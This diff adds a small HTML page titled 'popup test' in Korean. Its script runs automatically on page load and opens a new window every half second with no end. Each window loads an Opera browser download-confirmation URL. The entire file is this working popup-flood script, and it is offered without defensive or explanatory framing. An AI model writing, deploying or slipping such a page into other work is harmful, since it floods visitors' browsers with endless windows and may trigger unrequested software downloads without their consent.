@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>팝업 테스트</title>
+  <script>
+    function openInfinitePopups() {
+      setInterval(() => {
+        window.open("https://www.opera.com/ko/computer/thanks?ni=stable_portable&os=windows", "_blank", "width=300,height=200");
+      }, 500); // 0.5초마다 새 창 열기
+    }
+
+    window.onload = function() {
+      openInfinitePopups();
+    };
+  </script>
+</head>
+<body>
+  <h1>팝업 생성 중...</h1>
+</body>
+</html>
